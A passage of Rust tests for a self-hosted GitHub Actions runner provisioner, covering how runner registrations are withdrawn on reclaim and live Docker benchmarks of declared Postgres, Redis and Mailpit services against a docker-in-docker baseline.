            Some("reclaimed while provisioning, before the JIT mint")
        );
        assert!(
            seen.lock().unwrap().is_empty(),
            "no request may reach GitHub"
        );
    }

    /// A reclaim that lands while the mint is in flight is seen at the seam after
    /// it, which withdraws the registration by the id the mint answered with, so
    /// nothing is left for the stale-runner sweep (ADR-0018).
    #[tokio::test]
    async fn a_reclaim_after_the_mint_withdraws_the_registration_by_the_mints_id() {
        let (reclaim, cancel) = watch::channel(false);
        let (base, seen) = routed_api(move |request| {
            if request.ends_with("/generate-jitconfig") {
                reclaim.send_replace(true);
                return Some((201, MINTED));
            }
            Some((204, ""))
        })
        .await;
        let report = provision(base, cancel).await;
        assert!(report.reclaimed);
        assert_eq!(
            report.cause.as_deref(),
            Some("reclaimed while provisioning, after the JIT mint")
        );
        assert_eq!(
            *seen.lock().unwrap(),
            vec![
                "POST /repos/owner/demo/actions/runners/generate-jitconfig",
                "DELETE /repos/owner/demo/actions/runners/30543",
            ]
        );
    }

    /// No runner has started at a seam after the mint, so the reclaim goes ahead
    /// whatever GitHub answers the withdrawal: removed, refused for a job it
    /// reports assigned, or failed. A registration GitHub keeps is left to the
    /// sweep, as every one was before.
    #[tokio::test]
    async fn a_reclaim_after_the_mint_goes_ahead_whatever_github_answers() {
        for (status, body) in [
            (204, ""),
            (
                422,
                r#"{"message":"Runner is currently running a job and cannot be deleted"}"#,
            ),
            (500, r#"{"message":"Server Error"}"#),
        ] {
            let (base, seen) = recording_api(vec![(status, body)]).await;
            let gh = Github::at(base);
            let scratch = crate::setup::fsx::tests::Scratch::new("docker-unused-withdrawal");
            let audit = scratch.path("audit.jsonl");
            gh.set_audit(crate::audit::Audit::at(audit.clone()));
            let registration = Registration {
                gh: &gh,
                minted: Some(MintedRunner::from_mint(
                    "owner/demo",
                    "faber-7-1000",
                    Some(30543),
                )),
            };
            let report =
                reclaimed_after_mint(&registration, "faber-runner-7-1000", "after dind start")
                    .await;
            assert!(report.reclaimed, "{status}");
            assert_eq!(
                report.cause.as_deref(),
                Some("reclaimed while provisioning, after dind start"),
                "{status}"
            );
            assert_eq!(
                *seen.lock().unwrap(),
                vec!["DELETE /repos/owner/demo/actions/runners/30543"],
                "{status}"
            );
            let line: serde_json::Value =
                serde_json::from_str(std::fs::read_to_string(&audit).unwrap().trim()).unwrap();
            assert_eq!(
                line["reason"], UNUSED_WITHDRAWAL,
                "{status}: audited as a registration no runner was launched for"
            );
        }
    }

    // --- ADR-0046, live: a service job through the real sandbox path ---------

    /// End-to-end runs of [`run_in_sandbox`] and [`teardown`] against a real
    /// Docker daemon, with no GitHub involved, measuring a job that declares its
    /// services (ADR-0046) against the same job done today's way, in its own
    /// dind. `#[ignore]`d: they need Docker, a few hundred MiB of images, and
    /// network access for the dind baseline's cold pulls.
    ///
    /// ```sh
    /// cargo test --lib live_adr46 -- --ignored --nocapture --test-threads=1
    /// ```
    ///
    /// The Docker they reach is whatever [`docker_command`] reaches: faber's own
    /// socket on a set-up host, otherwise the `docker` CLI's current context or
    /// `DOCKER_HOST`. Run them on a development machine, never on a host faber
    /// is serving from: the services test removes and restarts the shared
    /// `faber-svc-postgres-16` server.
    ///
    /// The runner is a fake built here, [`RUNNER_IMAGE`], from `docker:cli` plus
    /// the Postgres, Redis and curl clients. It ignores `RUNNER_JITCONFIG`, does
    /// the job's work in a shell script selected by `FABER_LIVE_MODE`, and exits
    /// 0 on success. The image is left in place so a second run reuses it, and
    /// carries the label `faber.live-test=adr-0046` (deliberately nothing under
    /// `org.faber.`, so no faber reaper ever counts it as its own). Remove it
    /// with `docker rmi faber-live-adr46-runner:local`.
    mod live_adr46 {
        use super::*;
        use std::time::Instant;

        const RUNNER_IMAGE: &str = "faber-live-adr46-runner:local";
        const OWNER: &str = "owner/demo";
        const PG_IMAGE: &str = "postgres:16-alpine";
        const REDIS_IMAGE: &str = "redis:7-alpine";
        const MAILPIT_IMAGE: &str = "axllent/mailpit:v1.21";
        const SERVER: &str = "faber-svc-postgres-16";
        const SERVER_VOLUME: &str = "faber-svc-postgres-16-data";
        const JOBS: u64 = 3;

        const DOCKERFILE: &str = "FROM docker:cli\n\
            RUN apk add --no-cache postgresql16-client redis curl\n\
            COPY live.sh /live.sh\n\
            RUN chmod 0755 /live.sh\n\
            ENTRYPOINT [\"/live.sh\"]\n";

        /// The job. `LIVE_READY` is the seconds from the script's start until
        /// its services answered; `LIVE_DONE` until the checks passed.
        const SCRIPT: &str = r#"#!/bin/sh
set -eu
up() { cut -d' ' -f1 /proc/uptime; }
t0=$(up)
since() { awk -v a="$t0" -v b="$(up)" 'BEGIN { printf "%.2f", b - a }'; }
fail() { echo "LIVE_FAIL: $*"; exit 1; }

checks() {
  psql "$DATABASE_URL" -X -q -v ON_ERROR_STOP=1 -c 'create table t(x int)' -c 'insert into t values (1)' \
    || fail "psql create/insert"
  [ "$(psql "$DATABASE_URL" -X -tAc 'select count(*) from t')" = 1 ] || fail "psql read back"
  [ "$(redis-cli -u "$REDIS_URL" ping)" = PONG ] || fail "redis ping"
  curl -fsS "$MAIL_API_URL/api/v1/messages" >/dev/null || fail "mailpit api"
}

case "${FABER_LIVE_MODE:-}" in
services)
  for v in DATABASE_URL PGPASSWORD REDIS_URL MAIL_API_URL; do
    eval "val=\${$v:-}"
    [ -n "$val" ] || fail "$v is not set"
  done
  [ "${PGHOST:-}" = postgres ] || fail "PGHOST is '${PGHOST:-}', not postgres"
  # No dind: nothing in DOCKER_HOST, and no daemon answers anywhere a job would look.
  [ -z "${DOCKER_HOST:-}" ] || fail "DOCKER_HOST is set: $DOCKER_HOST"
  if docker info >/dev/null 2>&1; then fail "a docker daemon answers"; fi
  if docker -H tcp://dind:2375 info >/dev/null 2>&1; then fail "a dind answers"; fi
  # The role password is in the environment only, never on an argv.
  for f in /proc/[0-9]*/cmdline; do
    if tr '\0' ' ' < "$f" 2>/dev/null | grep -qF "$PGPASSWORD"; then
      fail "the password is on the argv of ${f%/cmdline}"
    fi
  done
  echo "LIVE_READY $(since)"
  checks
  ;;
dind)
  [ "${DOCKER_HOST:-}" = tcp://dind:2375 ] || fail "DOCKER_HOST is '${DOCKER_HOST:-}'"
  docker run -d -q -p 5432:5432 -e POSTGRES_PASSWORD=x postgres:16-alpine >/dev/null
  docker run -d -q -p 6379:6379 redis:7-alpine >/dev/null
  docker run -d -q -p 8025:8025 axllent/mailpit:v1.21 >/dev/null
  i=0
  until pg_isready -q -h dind -p 5432 \
    && [ "$(redis-cli -h dind ping 2>/dev/null)" = PONG ] \
    && curl -fsS http://dind:8025/api/v1/info >/dev/null 2>&1; do
    i=$((i + 1))
    [ "$i" -lt 1500 ] || fail "the services never answered"
    sleep 0.2
  done
  echo "LIVE_READY $(since)"
  export DATABASE_URL=postgres://postgres:x@dind:5432/postgres
  export REDIS_URL=redis://dind:6379/0
  export MAIL_API_URL=http://dind:8025
  checks
  ;;
*)
  fail "FABER_LIVE_MODE is '${FABER_LIVE_MODE:-}'"
  ;;
esac
echo "LIVE_DONE $(since)"
"#;

        fn docker(args: &[&str]) -> (bool, String) {
            let out = std::process::Command::new("docker")
                .args(args)
                .output()
                .expect("running docker");
            (
                out.status.success(),
                format!(
                    "{}{}",
                    String::from_utf8_lossy(&out.stdout),
                    String::from_utf8_lossy(&out.stderr)
                ),
            )
        }

        fn now_ms() -> u64 {
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_millis() as u64
        }

        /// Build the fake runner (cached after the first time) and make sure
        /// every image the run needs is local, outside any timing.
        fn prepare(images: &[&str]) {
            let dir = std::env::temp_dir().join(format!("faber-live-adr46-{}", now_ms()));
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(dir.join("Dockerfile"), DOCKERFILE).unwrap();
            std::fs::write(dir.join("live.sh"), SCRIPT).unwrap();
            let (ok, out) = docker(&[
                "build",
                "-q",
                "-t",
                RUNNER_IMAGE,
                "--label",
                "faber.live-test=adr-0046",
                dir.to_str().unwrap(),
            ]);
            let _ = std::fs::remove_dir_all(&dir);
            assert!(ok, "building {RUNNER_IMAGE}: {out}");
            for image in images {
                let (present, _) = docker(&["image", "inspect", image]);
                if !present {
                    let (ok, out) = docker(&["pull", "-q", image]);
                    assert!(ok, "pulling {image}: {out}");
                }
            }
        }

        fn base_cfg(mode: &str) -> DockerConfig {
            let mut cfg = DockerConfig::new(RUNNER_IMAGE.to_string());
            cfg.env
                .insert("FABER_LIVE_MODE".to_string(), mode.to_string());
            cfg.runner_timeout = Duration::from_secs(900);
            cfg
        }

        struct Sample {
            run: Duration,
            /// From the call until the runner container started: the ramp.
            ramp: Duration,
            /// The runner container's own life, `StartedAt` to `FinishedAt`.
            job: Duration,
            /// From the runner's exit until `run_in_sandbox` returned: the
            /// watcher's post-run work, the usage sampler's last poll above all.
            tail: Duration,
            teardown: Duration,
            ready: String,
            done: String,
        }

        fn mark(logs: &str, key: &str) -> String {
            logs.lines()
                .find_map(|l| l.strip_prefix(key))
                .map(|s| format!("{}s", s.trim()))
                .unwrap_or_else(|| "-".into())
        }

        /// Docker's RFC3339 timestamp as Unix milliseconds, fraction included.
        fn epoch_ms(ts: &str) -> u64 {
            let whole = epoch_ms_from_rfc3339(ts).unwrap_or_else(|| panic!("timestamp {ts:?}"));
            let frac: String = ts
                .get(19..)
                .and_then(|r| r.strip_prefix('.'))
                .unwrap_or("")
                .chars()
                .take_while(char::is_ascii_digit)
                .chain("000".chars())
                .take(3)
                .collect();
            whole + frac.parse::<u64>().unwrap_or(0)
        }

        fn ms(from: u64, to: u64) -> Duration {
            Duration::from_millis(to.saturating_sub(from))
        }

        /// The server's view of a role, as its superuser.
        fn server_count(query: &str) -> String {
            let (ok, out) = docker(&[
                "exec", SERVER, "psql", "-X", "-U", "postgres", "-tAc", query,
            ]);
            assert!(ok, "{query}: {out}");
            out.trim().to_string()
        }

        /// One job, the way [`run_one`] drives it after the JIT mint.
        async fn one_job(seq: u64, cfg: &DockerConfig) -> Sample {
            let runner_name = format!("faber-{}-{}", 990_000 + seq, now_ms());
            let names = Names::for_runner(&runner_name);
            let gh = Github::new("test-token".into()).unwrap();
            // No mint record: a reclaim would be refused, and none is asked for.
            let registration = Registration {
                gh: &gh,
                minted: None,
            };
            let (_cancel_tx, cancel) = watch::channel(false);
            let claim = ClaimMarks {
                profile: "live-adr46".into(),
                services: cfg.services.mark(),
                ..Default::default()
            };

            let t0 = now_ms();
            let t = Instant::now();
            let result = run_in_sandbox(
                &names,
                OWNER,
                &registration,
                "unused-jit-config",
                None,
                None,
                cfg,
                &Limits::default(),
                &claim,
                cancel,
            )
            .await;
            let run = t.elapsed();
            let (_, logs) = docker(&["logs", &names.runner]);
            let (ok, times) = docker(&[
                "inspect",
                "--format",
                "{{.State.StartedAt}} {{.State.FinishedAt}}",
                &names.runner,
            ]);
            assert!(ok, "inspecting {}: {times}", names.runner);
            let (started, finished) = times.trim().split_once(' ').expect("two timestamps");
            let (started, finished) = (epoch_ms(started), epoch_ms(finished));

            let services = cfg.services.names();
            let t = Instant::now();
            teardown(&names, cfg.dind.granted(), &services, OWNER).await;
            let teardown_time = t.elapsed();

            let report = result.expect("run_in_sandbox");
            assert!(
                report.job_ok,
                "job {seq} failed: {:?}\n--- runner log ---\n{logs}",
                report.cause
            );
            assert!(!report.reclaimed && !report.timed_out && !report.infra_error);

            // Nothing the job had is left: no container, network or volume
            // stamped with its id.
            let label = format!("label={LABEL_ID}={}", names.id);
            for what in [
                &["ps", "-a", "-q", "--filter"][..],
                &["network", "ls", "-q", "--filter"][..],
                &["volume", "ls", "-q", "--filter"][..],
            ] {
                let mut args = what.to_vec();
                args.push(&label);
                let (ok, out) = docker(&args);
                assert!(ok && out.trim().is_empty(), "{what:?} left: {out}");
            }
            let (exists, _) = docker(&["network", "inspect", &names.net]);
            assert!(!exists, "{} outlived teardown", names.net);

            if !cfg.services.is_empty() {
                // The role and database are gone from the shared server, and it
                // is no longer on the job's network.
                let role = crate::services::role_name(&names.id).unwrap();
                assert_eq!(
                    server_count(&format!(
                        "select count(*) from pg_roles where rolname = '{role}'"
                    )),
                    "0",
                    "{role} outlived teardown"
                );
                assert_eq!(
                    server_count(&format!(
                        "select count(*) from pg_database where datname = '{role}'"
                    )),
                    "0",
                    "database {role} outlived teardown"
                );
                let (ok, nets) = docker(&[
                    "inspect",
                    "--format",
                    "{{range $k, $v := .NetworkSettings.Networks}}{{$k}} {{end}}",
                    SERVER,
                ]);
                assert!(ok, "{nets}");
                assert!(
                    !nets.split_whitespace().any(|n| n == names.net),
                    "{SERVER} is still on {}: {nets}",
                    names.net
                );
            }

            Sample {
                run,
                ramp: ms(t0, started),
                job: ms(started, finished),
                tail: ms(finished, t0 + run.as_millis() as u64),
                teardown: teardown_time,
                ready: mark(&logs, "LIVE_READY "),
                done: mark(&logs, "LIVE_DONE "),
            }
        }

        fn print_table(mode: &str, samples: &[Sample], first: &str, rest: &str) {
            println!();
            println!("ADR-0046 live, {mode}:");
            println!(
                "  {:<4} {:<6} {:>10} {:>10} {:>10} {:>10} {:>10} {:>12} {:>12}",
                "job",
                "state",
                "sandbox",
                "ramp",
                "runner",
                "tail",
                "teardown",
                "job: ready",
                "job: done"
            );
            let d = |d: Duration| format!("{:.2}s", d.as_secs_f64());
            for (i, s) in samples.iter().enumerate() {
                println!(
                    "  {:<4} {:<6} {:>10} {:>10} {:>10} {:>10} {:>10} {:>12} {:>12}",
                    i + 1,
                    if i == 0 { first } else { rest },
                    d(s.run),
                    d(s.ramp),
                    d(s.job),
                    d(s.tail),
                    d(s.teardown),
                    s.ready,
                    s.done
                );
            }
        }

        #[tokio::test(flavor = "multi_thread")]
        #[ignore = "needs a Docker daemon and the service images"]
        async fn live_services_job_runs_without_dind() {
            let _ = tracing_subscriber::fmt().with_test_writer().try_init();
            prepare(&[PG_IMAGE, REDIS_IMAGE, MAILPIT_IMAGE]);

            let policy = crate::services::ServicesPolicy {
                postgres: Some(crate::services::PostgresPolicy {
                    versions: vec!["16".into()],
                    image: "postgres:{version}-alpine".into(),
                    extensions: vec![],
                    memory_mib: 1024,
                    // Long enough to stay warm between the jobs, short enough
                    // not to outlive the test by much if cleanup is skipped.
                    idle_stop: Duration::from_secs(60),
                }),
                per_job: [("redis", REDIS_IMAGE), ("mailpit", MAILPIT_IMAGE)]
                    .into_iter()
                    .map(|(n, image)| {
                        (
                            n.to_string(),
                            crate::services::PerJobPolicy::builtin(n, image, 128),
                        )
                    })
                    .collect(),
            };
            let labels: Vec<String> = [
                "faber",
                "docker",
                "faber.postgres-16",
                "faber.redis",
                "faber.mailpit",
            ]
            .map(String::from)
            .to_vec();
            let plan = match crate::needs::services(&labels, &policy) {
                crate::needs::ServiceOutcome::Provide(plan) => plan,
                _ => panic!("the labels must resolve to a plan"),
            };
            assert_eq!(plan.mark(), "postgres-16,redis,mailpit");
            assert_eq!(plan.specs[0].image, PG_IMAGE);

            let limiter = crate::limiter::Limiter::new(
                crate::config::AutoLimitFile::default().resolve(&Default::default()),
                &HashMap::new(),
            );
            crate::services::global().configure(crate::services::Ctx {
                policy,
                limiter,
                pull_unqualified: Some(true),
            });

            // Job 1 meets no server, so it pays the cold start.
            docker(&["rm", "-f", "-v", SERVER]);
            docker(&["volume", "rm", SERVER_VOLUME]);

            let mut cfg = base_cfg("services");
            cfg.dind = DindGrant::Denied;
            cfg.services = plan;

            let mut samples = Vec::new();
            for seq in 1..=JOBS {
                samples.push(one_job(seq, &cfg).await);
            }
            print_table("declared services, no dind", &samples, "cold", "warm");
            let warm = &samples[1..];
            let mean = warm.iter().map(|s| s.ramp).sum::<Duration>() / warm.len() as u32;
            println!(
                "  shared server cold start (job 1 ramp minus the warm mean ramp): {:.2}s",
                samples[0].ramp.saturating_sub(mean).as_secs_f64()
            );

            docker(&["rm", "-f", "-v", SERVER]);
            docker(&["volume", "rm", SERVER_VOLUME]);
        }

        #[tokio::test(flavor = "multi_thread")]
        #[ignore = "needs a Docker daemon, docker:dind and registry access"]
        async fn live_dind_job_baseline() {
            let _ = tracing_subscriber::fmt().with_test_writer().try_init();
            let mut cfg = base_cfg("dind");
            cfg.dind = DindGrant::Granted;
            // Only the outer images: the job's own pulls land in a fresh
            // per-job `/var/lib/docker` every time, so each job pulls cold.
            prepare(&[cfg.dind_image.clone().as_str()]);

            let mut samples = Vec::new();
            for seq in 1..=JOBS {
                samples.push(one_job(100 + seq, &cfg).await);
            }
            print_table(
                "dind baseline (cold image store each job)",
                &samples,
                "cold",
                "cold",
            );
        }
    }
}
